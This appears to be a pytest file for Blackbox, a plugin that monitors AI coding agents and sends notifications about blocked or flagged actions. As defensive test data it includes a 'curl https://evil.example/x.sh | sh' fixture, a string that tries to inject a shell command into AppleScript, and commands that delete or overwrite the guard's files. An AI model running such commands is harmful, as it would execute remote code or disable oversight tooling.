"""Native notifications from the plugin (Amos, 2026-11-22: "Blackbox needs to connect into
system native notifications when installed so it can push notifications about what agents are
doing, which agent is doing what, and if it is a malicious or non-malicious action").

Contracts: a notice says which agent, what it did and Blackbox's verdict and is safe on a lock
screen; the policy decides what is shown (security on by default, lifecycle and digest opt-in,
mute, quiet hours, a per-minute cap with one summary) and turning security notices off is a
weakening change; the collector answers only what is new and never announces one thing twice; ONE
deliverer shows the feed — Blackbox Desktop while it holds the lease, else the plugin's notifier —
with nothing shown twice and nothing lost at the hand-over.
"""

from __future__ import annotations

import sys
import time
import zipfile

import pytest
from fastapi.testclient import TestClient

from plugins.blackbox import approvals, notify, shields
from plugins.blackbox.dashboard import server
from plugins.blackbox.notify import deliver, feed, policy, sources, wording
from plugins.blackbox.notify.model import Notice

NOW = 1_795_000_000.0     # a Sunday afternoon UTC — outside the quiet hours used below


@pytest.fixture(autouse=True)
def _fresh():
    feed.reset()
    deliver.claim("", 0)
    yield
    feed.reset()
    deliver.claim("", 0)


def _finding(identifier="escalation:terminal:remote-script-pipe", decision="block", **more):
    return {"identifier": identifier, "category": "escalation", "severity": "critical", "title": "Remote script piped to a shell",
            "evidence": "curl https://evil.example/x.sh | sh", "framework": "claude-code", "workspace": "/Users/amos/Projects/payments",
            "source": "public", "decision": decision, "ts": NOW, "session_id": "claude-code:aaaaaaaaaaaaaaaa", "tool_call_id": "t1",
            "fields": {}, **more}


def _session(key="claude-code:aaaaaaaaaaaaaaaa", status="live", **more):
    return {"key": key, "agent": "claude-code", "kind": "session", "status": status, "waiting": "", "folder": "payments",
            "started": NOW - 60, "last": NOW, "ended": NOW if status == "ended" else None, "checked": 42, "refused": 0,
            "flagged": 0, "sandboxed": False, "sub_agents": [], **more}


def _tree(*sessions, unprotected=(), profiles=()):
    return {"products": [{"id": "claude-code", "name": "Claude Code", "profiles": [{"home": "", "instances": list(sessions)}]}],
            "unprotected": list(unprotected), "profiles": list(profiles)}


# ---- wording ---------------------------------------------------------------------------------

def test_a_stopped_action_says_which_agent_what_and_the_verdict_and_is_lock_screen_safe():
    notice = wording.finding(_finding())
    assert notice.title == "Blackbox stopped Claude Code"
    assert "Claude Code in payments tried a dangerous command" in notice.body
    assert "Stopped by Blackbox: it matches the verified threat graph." in notice.body
    assert notice.level == "critical" and notice.category == "security" and notice.instance == "claude-code:aaaaaaaaaaaaaaaa"
    shown = notice.title + notice.body
    for secret in ("evil.example", "curl", "/Users/amos", "Projects"):
        assert secret not in shown                         # a path, a command, an address: never on the lock screen
    assert "curl https://evil.example" in notice.detail    # the detail is what the person may opt into


def test_a_flagged_action_says_it_was_not_stopped():
    notice = wording.finding(_finding(decision="flag", source="community", severity="high"))
    assert notice.title == "Blackbox flagged Claude Code"
    assert "Flagged, not stopped: the community flagged it." in notice.body and notice.level == "warning"


def test_asking_for_root_and_running_as_root_have_their_own_words():
    asked = wording.finding(_finding("agent:elevation-request", decision="flag", source="custom", severity="high"))
    assert asked.kind == "elevation-request" and asked.title == "Claude Code asked for administrator rights"
    assert "Blackbox let it run and recorded it" in asked.body
    root = wording.finding(_finding("agent:running-as-root", decision="flag", source="custom", fields={"session": "claude-code:bbbb"},
                                    session_id=""))
    assert root.kind == "running-as-root" and root.level == "critical" and root.instance == "claude-code:bbbb"
    assert root.title == "Claude Code is running a program as root"


# ---- policy ----------------------------------------------------------------------------------

def test_security_is_on_and_everything_else_off_by_default():
    current = policy.parse({})
    assert (current.enabled, current.security, current.lifecycle, current.digest, current.details) == (True, True, False, False, False)
    security = wording.finding(_finding())
    started = wording.lifecycle("started", _session(), None, NOW)
    assert policy.held(current, security, NOW) == ""
    assert policy.held(current, started, NOW) == "off"
    assert policy.held(policy.parse({"lifecycle": True}), started, NOW) == ""


def test_a_muted_agent_and_quiet_hours_hold_a_notice_but_never_a_critical_one_in_quiet_hours():
    stopped = wording.finding(_finding())
    flagged = wording.finding(_finding(decision="flag", severity="high"))
    assert policy.held(policy.parse({"muted_agents": ["claude-code"]}), stopped, NOW) == "muted"
    hour = time.localtime(NOW).tm_hour
    always_quiet = policy.parse({"quiet_hours": f"{hour:02d}:00-{(hour + 1) % 24:02d}:00"})
    assert policy.held(always_quiet, flagged, NOW) == "quiet-hours"
    assert policy.held(always_quiet, stopped, NOW) == ""          # critical security still shows


def test_the_validator_refuses_a_malformed_section_and_keeps_a_good_one():
    errors: list[str] = []
    assert policy.validate({"security": "no", "quiet_hours": "late", "per_minute": 0, "muted_agents": ["nobody"]}, errors) == {}
    assert len(errors) == 4
    errors = []
    assert policy.validate({"lifecycle": True, "quiet_hours": "22:00-07:00", "per_minute": 3, "muted_agents": ["codex"]}, errors) == {
        "lifecycle": True, "quiet_hours": "22:00-07:00", "per_minute": 3, "muted_agents": ["codex"]}
    assert errors == []


def test_telling_the_person_less_about_threats_is_a_weakening_change():
    now = policy.parse({})
    assert policy.weakening({"lifecycle": True, "digest": True, "details": True}, now) == []
    assert policy.weakening({"lifecycle": False}, policy.parse({"lifecycle": True})) == []
    assert len(policy.weakening({"security": False}, now)) == 1
    assert len(policy.weakening({"enabled": False}, now)) == 1
    assert "Claude Code" in policy.weakening({"muted_agents": ["claude-code"]}, now)[0]
    assert policy.weakening({"muted_agents": []}, policy.parse({"muted_agents": ["claude-code"]})) == []


# ---- the collector ---------------------------------------------------------------------------

def _collector(findings, alerts, tree):
    return sources.Collector(read_alerts=lambda: list(alerts), read_findings=lambda: list(findings), read_live=lambda: tree[0])


def test_the_first_reading_only_learns_and_one_thing_is_news_once():
    findings, tree = [_finding()], [_tree(_session())]
    collector = _collector(findings, [], tree)
    assert collector.collect(NOW) == []                                   # what was already there is not news
    findings.append(_finding(ts=NOW + 5, tool_call_id="t2"))
    kinds = [notice.kind for notice in collector.collect(NOW + 5)]
    assert kinds == ["stopped"]
    assert collector.collect(NOW + 6) == []


def test_a_finding_a_shield_alert_speaks_for_is_not_announced_twice():
    hit = _finding("files:file-hit", ts=NOW + 1)
    alert = shields.ShieldAlert(key="file-hit:1", kind="file-hit", ts=NOW + 1, severity="critical", title="File Shield",
                                text="File Shield stopped an AI agent reaching Taxes.", finding="files:file-hit")
    findings, alerts = [], []
    collector = _collector(findings, alerts, [_tree()])
    collector.collect(NOW)
    findings.append(hit)
    alerts.append(alert)
    new = collector.collect(NOW + 2)
    assert [(notice.kind, notice.title) for notice in new] == [("shield:file-hit", "File Shield")]


def test_agents_starting_spawning_waiting_and_ending_become_lifecycle_and_digest_notices():
    tree = [_tree()]
    collector = _collector([], [], tree)
    collector.collect(NOW)
    sub = {"key": "claude-code:aaaaaaaaaaaaaaaa/abc", "agent": "claude-code", "kind": "sub-agent", "status": "live", "type": "Explore",
           "started": NOW + 2, "last": NOW + 2, "ended": None}
    tree[0] = _tree(_session(sub_agents=[sub]))
    started = collector.collect(NOW + 2)
    assert [notice.kind for notice in started] == ["started", "sub-agent-started"]
    assert started[1].title == "Claude Code started sub-agent Explore" and started[1].instance == "claude-code:aaaaaaaaaaaaaaaa"
    tree[0] = _tree(_session(status="waiting", waiting="permission", waiting_for="your answer to a permission question", sub_agents=[sub]))
    waiting = collector.collect(NOW + 3)
    assert [notice.kind for notice in waiting] == ["waiting"] and "waiting for your answer" in waiting[0].body
    tree[0] = _tree(_session(status="ended", refused=2, sub_agents=[{**sub, "status": "ended", "ended": NOW + 4}]))
    ended = {notice.kind: notice for notice in collector.collect(NOW + 5)}
    assert set(ended) == {"ended", "sub-agent-ended", "digest"}
    assert ended["digest"].body == "42 actions checked, 1 sub-agent: 2 refused."
    assert ended["digest"].category == "digest" and ended["ended"].category == "lifecycle"


def test_an_agent_without_blackbox_and_hooks_switched_off_are_security_notices():
    tree = [_tree()]
    collector = _collector([], [], tree)
    collector.collect(NOW)
    tree[0] = _tree(unprotected=[{"pid": 77, "agent": "claude-code", "started": NOW, "reason": "started with --bare, which skips every hook"}],
                    profiles=[{"agent": "codex", "problems": [{"kind": "hooks-off", "file": "/Users/amos/proj/.codex/config.toml",
                                                                  "detail": "features.hooks is false"}]}])
    new = collector.collect(NOW + 1)
    assert [(notice.kind, notice.category) for notice in new] == [("unprotected", "security"), ("hooks-off", "security")]
    assert "/Users/amos" not in new[1].title + new[1].body
    assert collector.collect(NOW + 2) == []                                # still there: not news again


def test_a_source_that_fails_costs_only_its_own_notices():
    def broken():
        raise RuntimeError("the shield registry is unreadable")
    findings = []
    collector = sources.Collector(read_alerts=broken, read_findings=lambda: list(findings), read_live=lambda: _tree())
    collector.collect(NOW)
    findings.append(_finding(ts=NOW + 1))
    assert [notice.kind for notice in collector.collect(NOW + 1)] == ["stopped"]


# ---- the pump: policy, feed, one deliverer -----------------------------------------------------

def _pump(findings, sent, **policy_fields):
    collector = _collector(findings, [], [_tree()])
    pump = deliver.Pump(collector=collector, send=lambda notice, details: sent.append((notice.id, details)) or True,
                        read_policy=lambda: policy.parse(policy_fields))
    pump.step(NOW)   # the first tick learns
    return pump


def test_a_new_finding_is_published_once_and_shown_once():
    findings, sent = [], []
    pump = _pump(findings, sent)
    findings.append(_finding(ts=NOW + 1))
    published = pump.step(NOW + 1)
    assert len(published) == 1 and published[0].seq == 1 and published[0].deliver is True
    assert len(sent) == 1 and sent[0][1] is False                          # details off by default
    pump.step(NOW + 2)
    assert len(sent) == 1 and feed.delivered() == 1
    assert [row["title"] for row in notify.history()] == ["Blackbox stopped Claude Code"]


def test_more_than_the_cap_in_a_minute_become_one_summary():
    findings, sent = [], []
    pump = _pump(findings, sent, per_minute=2)
    findings.extend(_finding(ts=NOW + 1 + n / 10, tool_call_id=f"t{n}") for n in range(6))
    published = pump.step(NOW + 2)
    assert [notice.held for notice in published] == ["", "", "rate", "rate", "rate", "rate"]
    assert len(sent) == 2                                                  # never a storm
    later = pump.step(NOW + 70)                                            # a minute on: one line says how many more
    assert [notice.kind for notice in later] == ["summary"] and later[0].body.startswith("4 more notifications")
    assert len(sent) == 3


def test_a_switched_off_kind_is_not_kept_and_a_muted_agent_is_kept_but_not_shown():
    findings, sent = [], []
    pump = _pump(findings, sent, security=False)
    findings.append(_finding(ts=NOW + 1))
    assert pump.step(NOW + 1) == [] and sent == []
    feed.reset()
    findings2, sent2 = [], []
    muted = _pump(findings2, sent2, muted_agents=["claude-code"])
    findings2.append(_finding(ts=NOW + 1))
    published = muted.step(NOW + 1)
    assert [(notice.deliver, notice.held) for notice in published] == [(False, "muted")] and sent2 == []
    assert feed.delivered() == published[0].seq                            # passed, so it is never shown later


def test_while_desktop_holds_the_lease_the_plugin_is_silent_and_nothing_is_shown_twice_or_lost():
    findings, sent = [], []
    pump = _pump(findings, sent)
    notify.claim("desktop", 30)
    findings.append(_finding(ts=NOW + 1, tool_call_id="a"))
    pump.step(NOW + 1)
    assert sent == [] and notify.holder() == "desktop"
    assert [row["seq"] for row in notify.rows(notify.delivered())] == [1]   # Desktop reads what is undelivered…
    notify.mark_delivered(1)                                                # …shows it and says so
    findings.append(_finding(ts=NOW + 2, tool_call_id="b"))
    pump.step(NOW + 2)
    assert sent == []
    notify.claim("desktop", 0)                                              # Desktop quits before showing #2
    pump.step(NOW + 3)
    assert [ident for ident, _ in sent] == [notify.rows(1)[0]["id"]]        # the plugin shows exactly the one not yet shown
    assert feed.delivered() == 2
    notify.claim("desktop", 30)                                             # Desktop is back: nothing left to show again
    assert notify.rows(notify.delivered()) == []


def test_a_lease_runs_out_by_itself(monkeypatch):
    clock = [1000.0]
    monkeypatch.setattr(deliver.time, "monotonic", lambda: clock[0])
    notify.claim("desktop", 30)
    assert notify.holder() == "desktop"
    clock[0] += 31
    assert notify.holder() == ""
    assert notify.claim("desktop", 99999) == deliver.MAX_LEASE_SECONDS


def test_a_notifier_that_raises_never_stops_the_pump_and_the_notice_stays_in_the_history():
    findings = []
    collector = _collector(findings, [], [_tree()])

    def broken(notice, details):
        raise OSError("the notification centre is gone")
    pump = deliver.Pump(collector=collector, send=broken, read_policy=lambda: policy.parse({}))
    pump.step(NOW)
    findings.append(_finding(ts=NOW + 1))
    assert len(pump.step(NOW + 1)) == 1
    assert len(notify.history()) == 1


def test_the_feed_survives_a_restart_and_does_not_repeat_itself():
    notice = Notice(id="finding:x", ts=NOW, category="security", kind="stopped", level="critical", title="t", body="b")
    assert feed.publish(notice).seq == 1
    assert feed.publish(notice) is None
    feed.mark_delivered(1)
    feed.reset()                                                            # a new dashboard process
    assert [row.id for row in feed.latest()] == ["finding:x"] and feed.delivered() == 1 and feed.top() == 1
    assert feed.publish(notice) is None
    assert feed.publish(Notice(id="finding:y", ts=NOW, category="security", kind="stopped", level="info", title="t", body="b")).seq == 2


# ---- over HTTP ---------------------------------------------------------------------------------

def _post(client, path, body):
    token = client.get("/api/session").json()["token"]
    return client.post(path, json=body, headers={"X-Blackbox-Token": token})


def test_the_routes_serve_the_feed_the_policy_and_the_lease():
    feed.publish(Notice(id="finding:x", ts=NOW, category="security", kind="stopped", level="critical", title="Blackbox stopped Codex", body="b"))
    with TestClient(server.create_app(), base_url="http://127.0.0.1:9700") as client:
        answer = client.get("/api/notifications/feed").json()
        assert answer["top"] == 1 and answer["delivered"] == 0 and [row["id"] for row in answer["notices"]] == ["finding:x"]
        assert client.get("/api/notifications/policy").json()["policy"]["security"] is True
        assert client.post("/api/notifications/lease", json={"holder": "desktop", "seconds": 30}).status_code in (401, 403)   # no token
        assert _post(client, "/api/notifications/lease", {"holder": "desktop", "seconds": 30}).json()["seconds"] == 30
        assert client.get("/api/notifications/feed").json()["holder"] == "desktop"
        assert _post(client, "/api/notifications/delivered", {"seq": 1}).json() == {"delivered": 1}
        assert client.get("/api/notifications/feed").json()["notices"] == []
        assert client.get("/api/notifications/history").json()["notices"][0]["title"] == "Blackbox stopped Codex"
        assert client.get("/notifications").status_code == 200


def test_saving_the_policy_applies_at_once_unless_it_tells_the_person_less():
    with TestClient(server.create_app(), base_url="http://127.0.0.1:9700") as client:
        more = _post(client, "/api/settings", {"notifications": {"lifecycle": True, "quiet_hours": "22:00-07:00"}})
        assert more.status_code == 200
        saved = client.get("/api/notifications/policy").json()["policy"]
        assert saved["lifecycle"] is True and saved["quiet_hours"] == "22:00-07:00"
        less = _post(client, "/api/settings", {"notifications": {"security": False}})
        assert less.status_code == 428                                      # held for the person
        assert client.get("/api/notifications/policy").json()["policy"]["security"] is True
        assert _post(client, "/api/settings", {"notifications": {"per_minute": 0}}).status_code == 400
    assert approvals.SECTION_JUDGES["notifications"]({"security": False})


# ---- the macOS notifier ------------------------------------------------------------------------

@pytest.mark.skipif(sys.platform != "darwin", reason="the macOS notifier")
def test_the_notifier_app_is_installed_only_from_an_archive_that_matches_its_checksum(tmp_path, monkeypatch):
    import hashlib

    from plugins.blackbox.notify.platform import macos
    monkeypatch.setattr(macos, "home", lambda: tmp_path / "notifier")
    archive = tmp_path / "blackbox-notify-darwin.zip"
    bundle = tmp_path / "src" / "Blackbox.app" / "Contents" / "MacOS"
    bundle.mkdir(parents=True)
    (bundle / "blackbox-notify").write_text('#!/bin/sh\ncase "$1" in status) echo authorized;; request) echo authorized;; send) echo sent;; esac\n',
                                           encoding="utf-8")
    (bundle / "blackbox-notify").chmod(0o755)
    with zipfile.ZipFile(archive, "w") as packed:
        packed.write(bundle / "blackbox-notify", "Blackbox.app/Contents/MacOS/blackbox-notify")
    digest = hashlib.sha256(archive.read_bytes()).hexdigest()
    with pytest.raises(ValueError):
        macos.install(archive, "0" * 64)
    stranger = tmp_path / "other.zip"
    with zipfile.ZipFile(stranger, "w") as packed:
        packed.writestr("Evil.app/Contents/MacOS/run", "x")
    with pytest.raises(ValueError):
        macos.install(stranger, hashlib.sha256(stranger.read_bytes()).hexdigest())   # not Blackbox.app: refused
    assert not (tmp_path / "notifier").exists() or not (tmp_path / "notifier" / "Blackbox.app").exists()
    status = macos.install(archive, digest)
    assert (status.kind, status.permission, status.available) == ("app", "authorized", True)
    assert macos.send("Blackbox stopped Claude Code", "body", "critical", "finding:x") is True
    macos.remove()
    assert not (tmp_path / "notifier").exists()
    assert macos.status().kind in ("fallback", "none")


@pytest.mark.skipif(sys.platform != "darwin", reason="the macOS notifier")
def test_text_can_never_break_out_of_the_fallback_script():
    from plugins.blackbox.notify.platform import macos
    quoted = macos._quoted('he said "hi" \\ and\n left" & do shell script "id')
    assert quoted.startswith('"') and quoted.endswith('"')
    assert '\\"' in quoted and "\n" not in quoted
    inner = quoted[1:-1].replace("\\\\", "").replace('\\"', "")
    assert '"' not in inner                                                # no quote is left unescaped


def test_an_agent_cannot_change_the_notifier_or_the_feed():
    """Both live in Blackbox's own data folder, which self-protection already covers."""
    from plugins.blackbox import detection
    from plugins.blackbox.kernel import constants
    home = constants.blackbox_home()
    for command in (f"rm -rf {home}/notifier", f"echo x > {home}/notifications/feed.jsonl",
                    f"cp /tmp/evil {home}/notifier/Blackbox.app/Contents/MacOS/blackbox-notify"):
        assert detection.detect_guard_tamper("terminal", {"command": command}), command


def test_the_real_sources_turn_a_recorded_refusal_and_a_root_run_into_notices(monkeypatch, tmp_path):
    """End to end inside the plugin: what the guard records is what the notifier says."""
    from plugins.blackbox import agent_hooks, audit
    from plugins.blackbox.agent_hooks import observe, root_watch, tracking
    from plugins.blackbox.agent_hooks.instances import store
    from plugins.blackbox.agent_hooks.instances.model import Instance
    store.reset()
    root_watch.reset()
    monkeypatch.setattr(agent_hooks, "_home", lambda: tmp_path)
    monkeypatch.setattr(observe.platform, "process_table", lambda: "")
    tracking._seen.update(at=0.0, table={}, running=[], pids=frozenset(), new_profiles=False)
    collector = sources.Collector()
    assert collector.collect() == []
    audit.record_for("codex", event="pre_tool_call", workspace="/Users/x/api",
                     findings=[{"identifier": "escalation:shell:remote-script-pipe", "category": "escalation", "severity": "critical",
                                "title": "Remote script piped to a shell", "evidence": "curl … | sh", "confirmed": True, "source": "public"}],
                     detail={"session_id": "codex:1111111111111111", "decision": "block", "tool_call_id": "c1"})
    session = Instance(key="codex:1111111111111111", agent="codex", kind="session", started=time.time(), last=time.time(), pid=4242,
                       cwd="/Users/x/api", folder="api")
    store.put(session)
    table = {4242: observe.Proc(4242, 1, time.time(), "codex"), 4243: observe.Proc(4243, 4242, time.time(), "/bin/bash install.sh")}
    root_watch.scan(table, {4242: (501, 501), 4243: (0, 0)}, [session])
    kinds = {notice.kind: notice for notice in collector.collect()}
    assert kinds["stopped"].title == "Blackbox stopped Codex" and "Codex in api" in kinds["stopped"].body
    assert kinds["running-as-root"].title == "Codex is running a program as root"
    assert kinds["running-as-root"].instance == "codex:1111111111111111" and kinds["running-as-root"].level == "critical"
    store.reset()
    root_watch.reset()


# ---- engine rule (2026-11-22): every notice comes from the core, each under its own switch ------

def test_a_watched_folder_notice_has_its_own_switch_on_by_default_and_turning_it_off_is_not_weakening():
    assert "watched" in notify.CATEGORIES and policy.parse({}).watched is True
    alert = shields.ShieldAlert(key="file-new:1", kind="file-new", ts=NOW, severity="info", title="File Shield",
                                text="A new file arrived in a watched folder.", category="watched")
    collector = sources.Collector(read_alerts=lambda: [alert], read_findings=list, read_live=_tree)
    notice = sources._shield_notice(alert)
    assert notice.category == "watched" and notice.level == "info"
    assert policy.held(policy.parse({}), notice, NOW) == ""
    assert policy.held(policy.parse({"watched": False}), notice, NOW) == "off"
    assert policy.weakening({"watched": False}, policy.parse({})) == []
    assert collector.collect(now=NOW) == []   # the first reading only learns


def test_a_shield_alert_with_an_unknown_category_is_a_security_notice():
    alert = shields.ShieldAlert(key="k", kind="x", ts=NOW, severity="high", title="t", text="x", category="made-up")
    assert sources._shield_notice(alert).category == "security"
